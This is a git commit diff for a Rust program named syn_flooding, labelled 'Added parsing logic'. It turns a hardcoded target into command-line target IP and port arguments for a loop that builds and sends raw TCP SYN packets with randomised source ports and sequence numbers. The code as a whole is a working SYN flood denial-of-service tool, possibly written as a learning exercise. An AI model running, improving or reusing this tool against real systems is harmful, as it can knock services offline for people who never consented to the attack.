a95ef93fcf0a2ee2c848a0af1e04c444dd4bef71
Polochon-street <polochonstreet@gmx.fr>
2019-04-16 20:55:55 +0200

    Added parsing logic

--- syn_flooding/src/main.rs
+++ syn_flooding/src/main.rs
@@ -8,26 +8,24 @@
 extern crate pnet;
 extern crate rand;
 
-use pnet::transport::{transport_channel, TransportProtocol};
+use std::env;
+use std::io::{self, Write};
+use std::net::{AddrParseError, IpAddr, Ipv4Addr};
+use std::{thread, time};
+use std::process;
+use std::num::ParseIntError;
+
+use pnet::transport::{transport_channel};
 use pnet::transport::TransportChannelType::{Layer4};
 use pnet::transport::TransportProtocol::Ipv4;
 use pnet::packet::ip::IpNextHeaderProtocols;
 
 use pnet::packet::tcp::{MutableTcpPacket};
-use pnet::packet::ipv4::{MutableIpv4Packet, checksum};
 use pnet::packet::tcp::TcpFlags::SYN;
 use pnet::packet::tcp::ipv4_checksum;
-use pnet::packet::MutablePacket;
-use std::net::Ipv4Addr;
-use std::net::IpAddr;
-use std::{thread, time};
 
-// Static stuff will be changed as args at the end
-static DEST_PORT: u16 = 22;
-static DEST_IP: &str = "192.168.0.33";
 
-fn main() {
-    let dest_ip = DEST_IP.parse::<Ipv4Addr>().unwrap();
+fn syn_flood_ip(dest_ip: Ipv4Addr, dest_port: u16) {
     let source_ip = "192.168.0.3".parse::<Ipv4Addr>().unwrap();
 
     let sleep_duration = time::Duration::from_millis(500);
@@ -37,7 +35,7 @@ fn main() {
         let mut tcp_packet = MutableTcpPacket::new(&mut tcp_buffer).unwrap();
         // Build TCP Packet
         tcp_packet.set_source(rand::random::<u16>());
-        tcp_packet.set_destination(DEST_PORT);
+        tcp_packet.set_destination(dest_port);
         tcp_packet.set_sequence(rand::random::<u32>());
         tcp_packet.set_acknowledgement(rand::random::<u32>());
         tcp_packet.set_flags(SYN);
@@ -63,4 +61,24 @@ fn main() {
         print!("Sent {} bytes.", bytes_sent);
         thread::sleep(sleep_duration);
     }
+}
+
+
+fn main() {
+    let mut args = env::args().skip(1);
+    let target_ip: Result<Ipv4Addr, AddrParseError> = match args.next() {
+        Some(n) => n.parse(),
+        None => {
+            writeln!(io::stderr(), "USAGE: ./bin <TARGET IP> <TARGET PORT>").unwrap();
+            process::exit(1);
+        }
+    };
+    let target_port: Result<u16, ParseIntError> = match args.next() {
+        Some(n) => n.parse(),
+        None => {
+            writeln!(io::stderr(), "USAGE: ./bin <TARGET IP> <TARGET PORT>").unwrap();
+            process::exit(1);
+        }
+    };
+    syn_flood_ip(target_ip.unwrap(), target_port.unwrap());
 }
